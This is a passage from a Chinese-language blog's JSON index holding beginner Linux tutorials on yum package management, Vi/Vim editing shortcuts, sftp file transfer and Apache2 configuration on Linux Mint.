--assumeyes answer yes for all questions --assumeno answer no for all questions --version show Yum version and exit --installroot=[path] set install root --enablerepo=[repo] enable one or more repositories (wildcards allowed) --disablerepo=[repo] disable one or more repositories (wildcards allowed) -x [package], --exclude=[package] exclude package(s) by name or glob --disableexcludes=[repo] disable exclude from main, for a repo or for everything --disableincludes=[repo] disable includepkgs for a repo or for everything --obsoletes enable obsoletes processing during updates --noplugins disable Yum plugins --nogpgcheck disable gpg signature checking --disableplugin=[plugin] disable plugins by name --enableplugin=[plugin] enable plugins by name --skip-broken skip packages with depsolving problems --color=COLOR control whether color is used --releasever=RELEASEVER set value of $releasever in yum config and repo files --downloadonly don't update, just download --downloaddir=DLDIR specifies an alternate directory to store packages --setopt=SETOPTS set arbitrary config and repo options --bugfix Include bugfix relevant packages, in updates --security Include security relevant packages, in updates --advisory=ADVS, --advisories=ADVS Include packages needed to fix the given advisory, in updates --bzs=BZS Include packages needed to fix the given BZ, in updates --cves=CVES Include packages needed to fix the given CVE, in updates --sec-severity=SEVS, --secseverity=SEVS Include security relevant packages matching the severity, in updates Plugin Options: 看的眼花缭乱的，不过这个只是一个前奏，下面来说下实际的应用吧，比如我要安装 apache2，那么可以直接1yum install apache2 这个时候会弹出是否确认要安装的提示，如果你要安装的软件包很多的时候，所有的包都要一个一个按 y 来确认，这样会显的很麻烦，这个时候可以加个 - y 的参数，这样就可以默认情况下忽略提示直接安装了1yum -y install apache2 libpcap libgcc python2 ..... 也许有的时候我们会遇到这样一个情况，当我们需要一个工具的时候，直接打 yum install … 要弄好半天，有的时候提示找不到这个软件。这个时候会很烦，若是我想知道我要用的软件到底叫什么名字，或者想查看类似的软件列表，这个时候就要用到搜索功能了，没错就是软件搜索！比如我要搜索 python1yum search python 这个时候你就会很清晰的看到可以安装的软件的列表，接下来就可以根据你的需要来安装软件了！其实，你也可以用 yum list | grep 想要的软件名，这样的形式来获取软件列表，比如1yum list | grep python 效果都一样。有的时候，要装一个软件，需要很多很多的包，比如桌面环境，这个时候一个一个包去敲会有点麻烦，yum 工具很人性化的提供了组安装的功能也就是一次性的安装一组软件，你可以用这个命令查看当前可以装的软件组1yum grouplist 这个时候你可以看到很多 yum 源里面准备好的软件组，比如我要装 GNOME 桌面环境的话，我只需要在类表里面找到 GNOME 这个组的名字。我这的 GNOME 桌面环境组的名字直接就叫做 GNOME Desktop，于是我输入以下命令就可以直接安装这个组1yum groupinstall GNOME Desktop 这样就完成了一次性安装整个软件组的操作了。有的时候，可能会因为网络问题，导致有些软件安装失败，如果需要重新安装的话，建议先 clean 一次1yum clean all 有的时候，我们想安装一些自定义的软件，由第三方提供了软件源。这个时候我们就需要修改 yum 的软件源。yum 源的列表在 CentOS 7 中默认在这个位置1# cd /etc/yum.repos.d/ 这个目录下的文件都是名为. repo 的文件，这些文件就是源的地址列表12345# ls -altotal 40drwxr-xr-x. 2 root root 4096 Mar 31 08:39 .drwxr-xr-x. 83 root root 4096 Mar 11 10:43 ..-rw-r--r--. 1 root root 1528 Dec 16 21:27 CentOS-Base.repo 可以 vi 进去看看1vi CentOS-Base.repo 一个标准的 repo 标签就是这样的12345[base]name=...baseurl=...gpgcheck=...gpgkey=... 当需要修改的时候，就是改这里的文件了，改完之后需要 yum update 一下，才会把新的源的软件列表添加到本地软件列表里","categories":[{"name":"日常运维","slug":"日常运维","permalink":"https://hexo.bangz.me/categories/日常运维/"}],"tags":[{"name":"Linux基础","slug":"Linux基础","permalink":"https://hexo.bangz.me/tags/Linux基础/"},{"name":"云计算","slug":"云计算","permalink":"https://hexo.bangz.me/tags/云计算/"},{"name":"CentOS","slug":"CentOS","permalink":"https://hexo.bangz.me/tags/CentOS/"}]},{"title":"「转自 IBM」技巧：快速提高 Vi/Vim 使用效率的原则与途径","slug":"26","date":"2015-03-29T06:16:00.000Z","updated":"2018-06-08T07:07:53.000Z","comments":true,"path":"archives/using-vim-to-improve-efficiency.html","link":"","permalink":"https://hexo.bangz.me/archives/using-vim-to-improve-efficiency.html","excerpt":"引言Vi 最初是由 Bill Joy 在 1976 年编码实现的。而 Vim (Vi IMproved) 则是改进的 Vi，由 Bram Moolenaar 在 1991 年开发并发布。Vi/Vim 是所有 Unix/Linux 操作系统默认配备的编辑器。因其强大的功能和高效的操作，Vi/Vim 也成为众多 Unix/Linux 用户、管理员必须掌握并熟练使用的编辑工具之一。尤其是在没有图形界面的情况下，更是离不开 Vi/Vim。Vi/Vim 命令非常多、用法极为灵活，掌握起来有一定的难度。详细介绍 Vi/Vim 使用方法的文章有很多，因而本文就不一一述及 Vi/Vim 的诸多功能及命令。本文作者将结合自己的使用经验，分七个方面着重介绍哪些原则、途径或命令能快速提高 Vi/Vim 文件编辑效率，从而达到事半功倍的效果。本文述及的途径或命令均只针对系统默认配置的 Vi/Vim。关于 Vi/Vim 各种定制后的功能不在本文讨论范围之列。（注：本文中提到的所有命令均在 Red Hat Enterprise Linux Server release 6.1 上测试通过。）","text":"引言Vi 最初是由 Bill Joy 在 1976 年编码实现的。而 Vim (Vi IMproved) 则是改进的 Vi，由 Bram Moolenaar 在 1991 年开发并发布。Vi/Vim 是所有 Unix/Linux 操作系统默认配备的编辑器。因其强大的功能和高效的操作，Vi/Vim 也成为众多 Unix/Linux 用户、管理员必须掌握并熟练使用的编辑工具之一。尤其是在没有图形界面的情况下，更是离不开 Vi/Vim。Vi/Vim 命令非常多、用法极为灵活，掌握起来有一定的难度。详细介绍 Vi/Vim 使用方法的文章有很多，因而本文就不一一述及 Vi/Vim 的诸多功能及命令。本文作者将结合自己的使用经验，分七个方面着重介绍哪些原则、途径或命令能快速提高 Vi/Vim 文件编辑效率，从而达到事半功倍的效果。本文述及的途径或命令均只针对系统默认配置的 Vi/Vim。关于 Vi/Vim 各种定制后的功能不在本文讨论范围之列。（注：本文中提到的所有命令均在 Red Hat Enterprise Linux Server release 6.1 上测试通过。） Vi/Vim 版本的选择“工欲善其事，必先利其器”。在 Vi/Vim 版本的选择上，原则是 “能用 Vim 就不要使用 Vi；能用最新版就不要守着旧版本”。Vim 提供的功能和特性要比 Vi 多得多，如语法加亮着色功能等。就使用效果及效率来说，编辑同样的文件，使用 Vim 更胜一筹；就版本来说，新版的往往会修复旧版的一些缺陷及不足。这就要求我们在可能的情况下一定要使用最新版的 Vim。小技巧：在 Linux 下，如果以 root 用户登录系统的话，通过 vi 命令打开的 Vim 编辑器往往只加载最基本的功能，像语法加亮着色的功能基本上没有。在 root 用户下使用 Vim 所有功能的技巧是用 vim 命令打开 Vim 编辑器。 启动及关闭 Vi/Vim打开及关闭 Vi/Vim 的方法有很多，既可以只启动 Vi/Vim 编辑器本身，也可以在启动 Vi/Vim 编辑器的同时打开一个或多个文件；既可以放弃存盘退出，也可以只保存文件的一部分。以下为相关命令列表： 表 1. 启动及关闭 Vi/Vim 的基本命令 功能 命令 说明 启动 vi 打开 Vi/Vimvi 打开 Vi/Vim 并加载文件 退出 ZQ 无条件退出: q! 无条件退出 ZZ 存盘并退出: wq 存盘并退出 保存部分文件 :m,nw 将 m 行到 n 行部分的内容保存到文件 中: m,nw &gt;&gt; 将 m 行到 n 行的内容添加到文件 的末尾 掌握并熟练这些基本命令是使用 Vi/Vim 的基本要求。只有这样，才能在实际使用过程中做到按需选择，灵活使用，提高 Vi/Vim 的使用效率。需要说明的一点是：在使用 Vi/Vim 的时候，有时想临时退出 Vi/Vim，转到 shell 环境里去做一些操作，等这些操作结束后，再继续回到刚才的 Vi/Vim 状态。针对这一经常碰到的现实需求，很多人在大多数情况下会将保存退出 Vi/Vim，进入 shell 执行操作，然后再重新打开刚才编辑的文件。其实这是一个很低效的方法，因为再次打开需要重新定位刚才编辑的地方，麻烦不说，Vi/Vim 编辑器的状态也完全不一样了。其实，有两种方法可以可以实现临时退出 Vi/Vim、进入 shell 环境后再回来的要求： 方法一：使用 Ctrl-z 以及 fg 这两个命令组合。这一解决方法主要利用了 Linux/Unix 的作业机制。具体原理是：Ctrl-z 命令将当前的 Vi/Vim 进程放到后台执行，之后 shell 环境即可为你所用；fg 命令则将位于后台的 Vi/Vim 进程放到前台执行，这样我们就再次进入 Vi/Vim 操作界面并恢复到原先的编辑状态。 方法二：使用行命令 :sh。在 Vi/Vim 的正常模式下输入 :sh 即可进入 Linux/Unix shell 环境。在要返回到 Vi/Vim 编辑环境时，输入 exit 命令即可。这两种方法实现机制不一定，但效果一样，都非常快捷有效。 移动光标Vi/Vim 中关于光标移动的命令非常多，这也是很多人经常困惑并且命令用不好的地方之一。其实 Vi/Vim 中很多命令是针对不同的操作单位而设的，不同的命令对应不同的操作单位。因而，在使用命令进行操作的时候，首先要搞清楚的就是要采用哪种操作单位，也就是说，是要操作一个字符，一个句子，一个段落，还是要操作一行，一屏、一页。单位不同，命令也就不同。只要单位选用得当，命令自然就恰当，操作也自然迅速高效；否则，只能是费时费力。这也可以说是最能体现 Vi/Vim 优越于其它编辑器的地方之一，也是 Vi/Vim 有人爱有人恨的地方之一。在操作单位确定之后，才是操作次数，即确定命令重复执行的次数。要正确高效的运用 Vi/Vim 的各种操作，一定要把握这一原则：先定单位再定量。操作对象的范围计算公式为：操作范围 = 操作次数 * 操作单位。比如：5h 命令左移 5 个字符，8w 命令右移 8 个单词。注：有些操作单位（如文件）是不能加操作次数。具体说明请参考 Vi/Vim 使用手册。Vi/Vim 中操作单位有很多，按从小到大的顺序为（括号内为相应的操作命令）：字符（h、l）→ 单词 (w、W、b、B、e) → 行 (j、k、0、^、$、:n) → 句子（(、)）→ 段落（{、}）→ 屏 (H、M、L) → 页（Ctrl-f、Ctrl-b、Ctrl-u、Ctrl-d) → 文件（G、gg、:0、:$）。具体命令解释如下： 操作单位 命令 说明 字符 h 左移一字符 l 右移一字符 单词 w/W 移动到下一单词的开头 b/B 移动到上一单词的开头 e/E 移动到光标所在单词的末尾 W、B、E 命令操作的单词是以空白字符（空格、Tab）分隔的字串，比如字符串 “str1-str2 str3-str4”，对 W、B、E 命令来说是两个单词，而对 w、b、e 命令来说则是四个单词。 行 j 下移一行 k 上移一行 0 移到当前行开头 ^ 移到当前行的第一个非空字符 $ 移到当前行末尾: n 移动到第 n 行 0 为数字零（zero） 句子 ) 移动到当前句子的末尾 ( 移动到当前句子的开头 段落 } 移动当前段落的末尾 { 移到当前段落的开头 屏 H 移动到屏幕的第一行 M 移动到屏幕的中间一行 L 移动到屏幕的最后一行 页 Ctrl-f 向前滚动一页 Ctrl-b 向后滚动一页 Ctrl-u 向前滚动半页 Ctrl-d 向后滚动半页 文件 G 移动到文件末尾 gg 移动到文件开头: 0 移动到文件第一行:$ 移动到文件最后一行 0 为数字零（zero） 除了这些基本单位之外，还有 %（跳转到与之匹配的括号处），`.（跳转到最近修改过的位置并定位编辑点），’.（跳转到最近修改过的位置但不定位编辑点）这三个命令也非常重要，在 Vi/Vim 中灵活使用会极大提高效率。% 除用于光标移动之后，还可用于检测源码中各种括号的匹配情况。 文本编辑与光标移动一样，Vi/Vim 中关于编辑操作的命令也比较多，但操作单位要比移动光标少得多。按从小到大的顺序为（括号内为相应的操作命令）：字符 （x、c、s、r、i、a）→ 单词 (cw、cW、cb、cB、dw、dW、db、dB) → 行 (dd、d0、d$、I、A、o、O) → 句子（(、)）→ 段落（{、}）。这些操作单位有些可以加操作次数。操作对象的范围计算公式为：操作范围 = 操作次数 * 操作单位。比如：d3w 命令删除三个单词，10dd 命令删除十行。具体命令解释如下： 表 3. 文本编辑的基本命令 操作单位 命令 说明 字符 x 删除光标位置的字符 c 更改当前字符并进入插入模式 s 替换光标位置的字符并进入插入模式 r 替换光标位置的字符但不进入插入模式 i 在当前位置的字符之前进入插入模式 a 在当前位置的字符之后进入插入模式 单词 cw/cW 删除当前单词从光标开始的部分并进入插入模式 cb/cB 删除当前单词从光标所在位置至单词开始的部分并进入插入模式 dw/dW 删除当前单词从光标开始的部分但不进入插入模式 db/dB 删除当前单词从光标所在位置至单词开始的部分但不进入插入模式 cW、cB、dW、dB 命令操作的单词是以空白字符（空格、Tab）分隔的字串，比如字符串 “str1-str2 str3-str4”，对 cW,cB,dW,dB 命令来说是两个单词，而对 cw、cb、dw、db 命令来说则是四个单词。 行 dd 删除当前行 d0 删除从当前光标开始到行末的内容 d$ 删除从当前光标开始到行末的内容 I 在当前行的行首进入插入模式 A 在当前行的行尾进入插入模式 o 在当前行下方另起一行进入插入模式 O 在当前行上方另起一行进入插入模式 - d0 命令中的 0 为数字零 - o 为小写英文字母 [əu]- O 为大写英文字母 [əu] 句子 d) 删除当前句子从光标位置开始到句末的内容 d( 删除当前句子从光标位置开始到句首的内容 段落 d} 删除当前段落从光标位置开始到段末的内容 d{ 删除当前段落从光标位置开始到段首的内容 除上述最基本的文本编辑命令这外，Vi/Vim 还提供了许多其它的编辑命令或相关组合。使用这些命令或相关组合往往在极大提高文本编辑的效率与速度。现将这些命令按功能列如表下： 表 4. 文本编辑的高效命令 功能 命令 说明 复制与粘贴 yw 复制当前单词从光标开始的部分 yy 复制光标所在行的所有字符 p 将最后一个删除或复制文本放在当前字符 P 将最后一个删除或复制文本放在当前字符之前 配合操作数使用可快速拷贝编辑文本 撤消与重做 u 撤消更改 Ctrl-R 重做更改 非常实用的一个命令 重复操作 . 重复上次操作 - . 为小数点（dot）- 配合光标移动命令使用；- 不用重复输入先前的复杂命令即可在不同的地方做同样的操作，有点象 MS Office 的格式刷 交换相邻字符或行 xp 交换光标位置的字符和它右边的字符 ddp 交换光标位置的行和它的下一行 大小写转换 ~ 将光标下的字母大小写反向转换 guw 将光标所在的单词变为小写 guw 将光标所在的单词变为小写 gUw 将光标所在的单词变为大写 guu 光标所在的行所有字符变为小写 gUU 光标所在的行所有字符变为大写 g~~ 光标所在的行所有字符大小写反向转换 取得外部输入 : r! 将命令 的输出结果插入到当前光标所在位置: r 将文件 读入到当前光标所在位置 排序 :1,$!sort 将文件内的所有内容排序 加入行号 :%!nl 在所有非空行前加入行号:%!nl -ba 在所有行前加入行号 利用 Linux 命令 nl 来实现的 缩进 &gt;&gt; 右缩进（可配合操作数使用）&lt;&lt; 左缩进（可配合操作数使用） 配合操作数使用，在编辑源码的时候非常有用。 自动补全 Ctrl-p 自动补全 在编写代码的时候非常有用。比如，输入 prin 后按 Ctrl-p 将自动帮你输入 printf 函数名后面的部分，同时将相关备选函数在底下列出来。 显示当前编辑文件名 Ctrl-g 显示当前编辑文件名及行数 可以在不退出 Vi/Vim 情况下了解当前编辑文件的信息 显示字符内码 ga 显示光标所在字符的内码（包括十进制码，十六进制码以及八进制码） 显示的内码为当前 encoding 下的内码 文本搜索与替换Vi/Vim 用于文本搜索的主要有下面的三个基本命令： 表 5. 文本搜索的基本命令 功能 命令 说明 搜索 / 在文件中向前搜索? 在文件中向后搜索 - 可使用正则表达式 - 可配合操作数使用，比如 3/str 向前搜索字串 str 并将光标移到第三个找到的串 搜索下一个 n 搜索下一个 N 反向搜索下一个 - 可使用正则表达式 - 可配合操作数使用，比如命令 3N 反向搜索第三个匹配的字符串 除这三个基本命令之外，还有以下三个非常有效快捷的与搜索查找有关的命令： 表 6. 文本搜索的高效命令 功能 命令 说明 快速搜索 * 在文件中向前搜索当前光标所在的单词# 在文件中向后搜索当前光标所在的单词 非常快捷的搜索命令 显示搜索命令历史 q/ 显示搜索命令历史的窗口 q? 显示搜索命令历史的窗口 可以选择重用以前用过的搜索查找命令 查找帮助 Shift-k 查找光标所在命令或函数的 man 帮助 - 可以在不退出 Vi/Vim 情况下快速查询命令或函数的使用方法；- 按 q 键退出 man 帮助 关于替换主是要结合搜索使用行命令来实现，命令格式为：:m,ns/str1/str2/g 将 m 行到 n 行中的字串 str1 全部替换为字串 str2。在众多使用正则表达式进行替换的命令中，平时需要掌握的一个命令是如何快速去除 ^M 字符。在 Linux/Unix 系统中编辑 Windows 操作系统中生成的文件时，如果上传时回车换行符处理不正确的话，用 Vi/Vim 打开经常会出现 ^M 字符。如果上传的文件是 shell 脚本的话，即使赋予了正确的执行权限该脚本还是无法运行。这也是各种文件在 Linux/Unix 和 Windows 中传输经常会出现问题的地方之一。其实，在 Vi/Vim 中使用替换命令 :1,$s/^M//g 即可以很容易地快速去掉 ^M 字符。这里需要注意的是 ^M 是使用 Ctrl-v、Ctrl-m 输入的。 执行外部命令在 Vi/Vim 中还可以在正常模式下执行各种外部命令，命令格式如下： 表 7. 执行外部命令格式 功能 命令 说明 执行外部命令 :! 执行外部命令 在正常模式下输入该命令 显示命令行命令历史 q: 显示命令行命令历史的窗口 可以选择重用以前用过的命令行命令 Vi/Vim 设置Vi/Vim 有很多内部变量，可以根据需要进行相应的设置。变量类型不同往往设置方式也不一样，简单的只要设置特定的变量名即可，复杂的则需要指定和分配一个显式值来设置变量。在实际应用中，如果有需要，请参考 Vi/Vim 的使用手册。这里主要列出大家经常使用并能提高编辑效率的一些设置命令： 表 8. Vi/Vim 设置命令 功能 命令 说明 查看设置的当前值 :set all 查看 vi 或 Vim 中设置的所有选项的当前值: set ? 查看特定选项 的当前值 设置行号显示与否 :set number 显示行号: set no number 取消行号显示 命令的简写形式：:set nu:set no nu 设置自动缩进 :set autoindent 设置自动缩进: set no autoindent 取消自动缩进设置 命令的简写形式：:set ai:set no ai 设置缩进宽度 :set shiftwidth=4 设置缩进宽度为 4 命令的简写形式：:set sw=4 设置大小写忽略与否 :set ignorecase 设置忽略大小: set no ignorecase 取消忽略大小设置 命令的简写形式：:set ic:set no ic 设置不可见字符显示与否 :set list 显示不可见字符: set nolist 取消显示不可见字符设置 在显示不可见字符的情况下，TAB 键显示为 ^I，而 $ 显示在每行的结尾。 在正常模式 (Normal mode) 时，执行这些设置命令只修改当前会话的设置，退出或重启 Vi/Vim 这些设置就丢失了。要想保持住这些设置，就必须将这些设置写入 Vi/Vim 的 vimrc 文件。对 Linux/Unix 操作系统来说，每个用户的 vimrc 文件位于该用户的主目录下，文件名为 .vimrc。Vi/Vim 在每次启动的时候都会读取用户主目录下的 vimrc 文件并据此设置 Vi/Vim 的使用环境。Vi/Vim 在安装的同时也会安装 vimrc 文件的一个示例 vimrc_example.vim 到 /usr/share/vim/vim 目录下。可以根据需要将这个示例文件拷贝到当前用户的主目录下并重命名为 .vimrc，在此基础上进行修改会相对容易一些。其它关于 Vi/Vim 的一些定制和键映射等相关设置基本上也是写入用户的 vimrc 文件中，更详细的介绍请参考 Vi/Vim 的使用手册。用户也可以维护一个自己的 vimrc 文件，并将这个文件拷贝到自己的使用的环境中，保持不同环境中 Vi/Vim 特性的一致，以符合自己的使用习惯。 结束语本文主要介绍了快速提高 Vi/Vim 使用效率的途径及相关命令，熟练掌握这些是高效使用 Vi/Vim 的基本要求。关于 Vi/Vim，还有很多其它命令以及定制功能本文没有涉及到。大家可结合自己的使用情况及需求，在本文的基础上进行拓展，不断提高自己的 Vi/Vim 使用水平。","categories":[{"name":"技术研究","slug":"技术研究","permalink":"https://hexo.bangz.me/categories/技术研究/"}],"tags":[{"name":"Linux基础","slug":"Linux基础","permalink":"https://hexo.bangz.me/tags/Linux基础/"},{"name":"操作系统","slug":"操作系统","permalink":"https://hexo.bangz.me/tags/操作系统/"}]},{"title":"sftp 工具的使用","slug":"25","date":"2015-03-24T22:21:00.000Z","updated":"2018-06-08T07:07:53.000Z","comments":true,"path":"archives/using-sftp-tool.html","link":"","permalink":"https://hexo.bangz.me/archives/using-sftp-tool.html","excerpt":"这个工具可以使用跟 ssh 协议进行文件传输，在一些情况下还是挺好用的用连接远程计算机1sftp root@192.168.1.1 登录成功后用 help 可以看到 sftp 的基本指令","text":"这个工具可以使用跟 ssh 协议进行文件传输，在一些情况下还是挺好用的用连接远程计算机1sftp root@192.168.1.1 登录成功后用 help 可以看到 sftp 的基本指令 1234567891011121314151617181920212223242526272829303132Available commands:bye Quit sftpcd path Change remote directory to 'path'chgrp grp path Change group of file 'path' to 'grp'chmod mode path Change permissions of file 'path' to 'mode'chown own path Change owner of file 'path' to 'own'df [-hi] [path] Display statistics for current directory or filesystem containing 'path'exit Quit sftpget [-Ppr] remote [local] Download filereget remote [local] Resume download filehelp Display this help textlcd path Change local directory to 'path'lls [ls-options [path]] Display local directory listinglmkdir path Create local directoryln [-s] oldpath newpath Link remote file (-s for symlink)lpwd Print local working directoryls [-1afhlnrSt] [path] Display remote directory listinglumask umask Set local umask to 'umask'mkdir path Create remote directoryprogress Toggle display of progress meterput [-Ppr] local [remote] Upload filepwd Display remote working directoryquit Quit sftprename oldpath newpath Rename remote filerm path Delete remote filermdir path Remove remote directorysymlink oldpath newpath Symlink remote fileversion Show SFTP version!command Execute 'command' in local shell! Escape to local shell? Synonym for help 简单的做个总结，在可以直接使用 lls cd pwd 这些命令进行路径操作要对本地的命令进行操作的话，需要在这些基础命令的前面加上一个字母 “l”也就是 cd 变成了 lcd，pwd 变成了 lpwd，ls 变成了 lls若要从对方机器上下载文件到本地的话，使用 get 命令1get /etc/hosts 这样就下载到了本地的当前目录下了若要从本地上传文件到对方机器，可以使用 put 命令1put /etc/hosts 若要上传或者下载整个目录，则加上 - r 参数即可12get -r ./helloput -r ./12345 操作完之后退出也有好几个命令123exitquitbye 这个工具在进行文件传输的时候还是很方便的，能够进行交互式的文件管理操作，但是有一些系统比如 OpenWRT 之类的话，可能会默认没安装 sftp-server，这个时候也就只能用 scp 了。","categories":[{"name":"日常运维","slug":"日常运维","permalink":"https://hexo.bangz.me/categories/日常运维/"}],"tags":[{"name":"Shell","slug":"Shell","permalink":"https://hexo.bangz.me/tags/Shell/"},{"name":"Linux基础","slug":"Linux基础","permalink":"https://hexo.bangz.me/tags/Linux基础/"},{"name":"操作系统","slug":"操作系统","permalink":"https://hexo.bangz.me/tags/操作系统/"},{"name":"云计算","slug":"云计算","permalink":"https://hexo.bangz.me/tags/云计算/"}]},{"title":"关于 apache 服务器的使用学习","slug":"21","date":"2015-03-24T18:52:00.000Z","updated":"2018-06-08T07:41:24.000Z","comments":true,"path":"archives/learning-apache-server-on-linux.html","link":"","permalink":"https://hexo.bangz.me/archives/learning-apache-server-on-linux.html","excerpt":"看人家的教程都是在 windows 环境下配置的 apache，我在这里用 linuxmint 研究了一下 apache2，顺手写一下笔记安装方法：1sudo apt-get install apache2 其实我是冲着搭建 LAMP 环境来的，mysql 和 php 暂时就不说了查了一下 apache2 安装完之后的目录结构默认主要安装到了一下目录12/etc/apache2//usr/share/apache2/ 主配置文件 apache2.conf 在 /etc/apache2 下默认主页 index.html 在 /usr/share/apache2/default-site 下这个是官方给的一个目录结构12345678910/etc/apache2/|-- apache2.conf| `-- ports.conf|-- mods-enabled| |-- *.load| `-- *.conf|-- conf-enabled| `-- *.conf|-- sites-enabled| `-- *.conf 默认主站位置在这里 The default Ubuntu document root is /var/www/html了解到这里差不多先够了，下面来一步一步记录一下 apache2 的使用方法","text":"看人家的教程都是在 windows 环境下配置的 apache，我在这里用 linuxmint 研究了一下 apache2，顺手写一下笔记安装方法：1sudo apt-get install apache2 其实我是冲着搭建 LAMP 环境来的，mysql 和 php 暂时就不说了查了一下 apache2 安装完之后的目录结构默认主要安装到了一下目录12/etc/apache2//usr/share/apache2/ 主配置文件 apache2.conf 在 /etc/apache2 下默认主页 index.html 在 /usr/share/apache2/default-site 下这个是官方给的一个目录结构12345678910/etc/apache2/|-- apache2.conf| `-- ports.conf|-- mods-enabled| |-- *.load| `-- *.conf|-- conf-enabled| `-- *.conf|-- sites-enabled| `-- *.conf 默认主站位置在这里 The default Ubuntu document root is /var/www/html了解到这里差不多先够了，下面来一步一步记录一下 apache2 的使用方法 一、启动，关闭，重启 apache2，有两种方法第一种是直接用 apachectl12$ apachectlUsage: /usr/sbin/apachectl start|stop|restart|graceful|graceful-stop|configtest|status|fullstatus|help 第二种是直接的简单启动方式1/etc/apache2 &#123;start|stop|graceful-stop|restart|reload|force-reload|start-htcacheclean|stop-htcacheclean&#125; 当第一种启动方式启动不了的时候，就尝试使用第二种启动方式，在端口和进程都正常的情况下，第二种启动方式绝对可以达到目的。 二、配置 apache2 的服务端口比如配置 HTTP 访问端口到 80801sudo vi /etc/apache2/ports.conf 我们会看到这一行1LISTEN 80 只需把上面的 80 改成 8080，然后重启 apache2 即可 三、编辑默认主站位置也就是找到 DocumentRoot 的位置，这个不像 windows 里的 apache 那样全都放在了 httpd.conf 里，而是放在了 / etc/apache2/sites-enabled / 的那个 conf 文件里在这个文件夹里，我只看到了一个 conf 文件，所以很容易就找到了12345/etc/apache2/sites-enabled $ ls -altotal 8drwxr-xr-x 2 root root 4096 Mar 18 17:31 .drwxr-xr-x 8 root root 4096 Mar 18 17:35 ..lrwxrwxrwx 1 root root 35 Mar 15 21:11 000-default.conf -&amp;gt; ../sites-available/000-default.conf 它是 link 到 sites-available 的一个文件， 既然只有一个，那就方便了直接 $ vi 000-default.conf，结果很快就看到了1DocumentRoot /var/www/html 修改之后重启 apache 即可其实 ServerName 也可以在这里改，在这里就不细说了。 四、修改默认加载页面也就是原来 windows 下的 httpd.conf 里的 IfModule dir_module在 linux 下它被放在了 / etc/apache2/mods-enabled/dir.conf 里要修改直接 vi 即可12&lt;ifmodule mod_dir.c=\"\"&gt; DirectoryIndex index.html index.cgi index.pl index.php index.xhtml index.htm 修改完后记得重启 apache 五、修改访问权限这个要到 conf-enabled 目录里去设置，应该是 security.conf 这个文件1vi conf-enabled/security.conf 然后在末尾添加相应的访问权限语句即可，修改完后重启 apache 即生效 六、虚拟主机配置这个其实也是在 000-default.conf 里面配置之前在看 ports.conf 的时候，已经看到了这样的提示123# If you just change the port or add more ports here, you will likely also# have to change the VirtualHost statement in# /etc/apache2/sites-enabled/000-default.conf 所以其实前面改端口的时候，也需要同时过去重新配置好虚拟主机的端口1vi sites-enabled/000-default.conf 只需根据里面的注释来配置即可，配置完后要重启 apache","categories":[{"name":"日常运维","slug":"日常运维","permalink":"https://hexo.bangz.me/categories/日常运维/"}],"tags":[{"name":"Linux基础","slug":"Linux基础","permalink":"https://hexo.bangz.me/tags/Linux基础/"},{"name":"操作系统","slug":"操作系统","permalink":"https://hexo.bangz.me/tags/操作系统/"},{"name":"Apache","slug":"Apache","permalink":"https://hexo.bangz.me/tags/Apache/"},{"name":"LAMP","slug":"LAMP","permalink":"https://hexo.bangz.me/tags/LAMP/"}]},{"title":"vi 编辑器的使用","slug":"20","date":"2015-03-24T16:53:00.000Z","updated":"2018-06-08T07:07:53.000Z","comments":true,"path":"archives/using-linux-vi-editor.html","link":"","permalink":"https://hexo.bangz.me/archives/using-linux-vi-editor.html","excerpt":"继续上次的课题，这回写一下关于 vi 这个编辑器的学习笔记首先说下地位吧，vi 现在已经成为主流 linux 下的必备编辑器，它由最早的 ed 发展而来，当 vi 编辑器不能使用的时候，可使用 ed 代替vi 编辑器的默认安装位置一般在 / bin / 下12root@OpenWrt:~# which vi/bin/vi 在有些发行版的 linux 下，vi 会自动 alias 到 vim，或者干脆把 vim 改名为 vi比如我现在用的 linuxmint 17.11234567891011monolight@monolight-QTJ5 ~ $ whereis vivi: /usr/bin/vi /usr/bin/X11/vi /usr/share/man/man1/vi.1.gzmonolight@monolight-QTJ5 ~ $ aliasalias grep='grep --colour=auto'alias ll='ls -al'alias ls='ls --color=auto'monolight@monolight-QTJ5 ~ $ vi --versionVIM - Vi IMproved 7.4 (2013 Aug 10, compiled Jan 2 2014 19:39:02)Included patches: 1-52Modified by pkg-vim-maintainers@lists.alioth.debian.orgCompiled by buildd@","text":"继续上次的课题，这回写一下关于 vi 这个编辑器的学习笔记首先说下地位吧，vi 现在已经成为主流 linux 下的必备编辑器，它由最早的 ed 发展而来，当 vi 编辑器不能使用的时候，可使用 ed 代替vi 编辑器的默认安装位置一般在 / bin / 下12root@OpenWrt:~# which vi/bin/vi 在有些发行版的 linux 下，vi 会自动 alias 到 vim，或者干脆把 vim 改名为 vi比如我现在用的 linuxmint 17.11234567891011monolight@monolight-QTJ5 ~ $ whereis vivi: /usr/bin/vi /usr/bin/X11/vi /usr/share/man/man1/vi.1.gzmonolight@monolight-QTJ5 ~ $ aliasalias grep='grep --colour=auto'alias ll='ls -al'alias ls='ls --color=auto'monolight@monolight-QTJ5 ~ $ vi --versionVIM - Vi IMproved 7.4 (2013 Aug 10, compiled Jan 2 2014 19:39:02)Included patches: 1-52Modified by pkg-vim-maintainers@lists.alioth.debian.orgCompiled by buildd@ vim 是全称是 Vi IMproved 即 vi 的升级版，所以现在基本上主要使用的是 vim 了，一般来讲，linux 系统安装完之后都会自带这个，如果需要安装 vim，可以去源里面安装一下RedHat 阵营：1yum install vim Debian 阵营：1apt-get install vim 由于 vim 和 vi 的基本使用方法的区别不是太大，所以打算两个一起来说，在这里先唠叨一句，在如果 vi 和 ed 都没有的情况下，如果只是单纯的需要生成一个简单的文件，其实用 touch 或者 echo 命令就能完成了比如生成一个空文件 aa，直接 touch 即可123$ touch aa$ lsaa 又比如说，把 hello 写入一个叫 aa 的文件，直接用 echo 加写入符即可123$ echo hello &amp;gt; aa$ cat aahello PS：跟 windows 下一样，”&gt;” 表示覆盖文件，”&gt;&gt;” 表示追加到文件知道了这个之后，再来看 vi，就能更深刻的理解 vi 的作用和特点了这里继续以 aa 为例，编辑 aa 这个文件1vi aa 如果当前位置下没有 aa 这个文件，vi 将会生成一个新的文件vi 里面有三种模式： 命令模式 编辑模式 命令行模式此时默认情况下会是命令模式，所有的指令都是直接按即生效的在这里列举一下命令模式中常用的几个基本命令i：在当前光标位置插入编辑模式I：返回当前行的首部并进入编辑模式a：在当前光标位置后面进行追加A：在当前行的尾部进行追加o：往下方新起一行并进入编辑模式O：往上方新起一行并进入编辑模式s：删除当前光标位置的字符并进入编辑模式S：清空当前行并进入编辑模式r：替换当前位置的字符R：一直替换，替换到按 Esc 结束为止Esc：退出编辑模式数字 